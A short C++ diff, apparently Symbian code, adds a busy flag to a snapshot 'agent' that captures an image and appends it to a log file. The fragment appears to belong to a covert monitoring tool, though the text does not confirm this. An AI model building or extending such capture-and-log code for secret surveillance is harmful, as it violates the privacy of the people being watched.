@@ -15,7 +15,7 @@
 #include "Json.h"
 
 CAgentSnapshot::CAgentSnapshot() :
-	CAbstractAgent(EAgent_Snapshot)
+	CAbstractAgent(EAgent_Snapshot),iBusy(EFalse)
 	{
 	// No implementation required
 	}
@@ -95,6 +95,11 @@ void CAgentSnapshot::ConstructL(const TDesC8& aParams)
 
 void CAgentSnapshot::StartAgentCmdL()
 	{
+	if(iBusy)
+		return;
+	
+	iBusy = ETrue;
+	
 	DoCaptureL();
 		
 	RBuf8 buf(GetImageBufferL());
@@ -107,7 +112,7 @@ void CAgentSnapshot::StartAgentCmdL()
 			{
 			TSnapshotAdditionalData additionalData;
 		
-			CLogFile* logFile = CLogFile::NewLC(iFs);
+			CLogFile* logFile = CLogFile::NewLC(iFs); 
 			logFile->CreateLogL(LOGTYPE_SNAPSHOT, &additionalData);
 			logFile->AppendLogL(buf);
 			logFile->CloseLogL();
@@ -115,6 +120,7 @@ void CAgentSnapshot::StartAgentCmdL()
 			}
 		}
 	CleanupStack::PopAndDestroy(&buf);
+	iBusy = EFalse;
 	}
 
 void CAgentSnapshot::StopAgentCmdL()
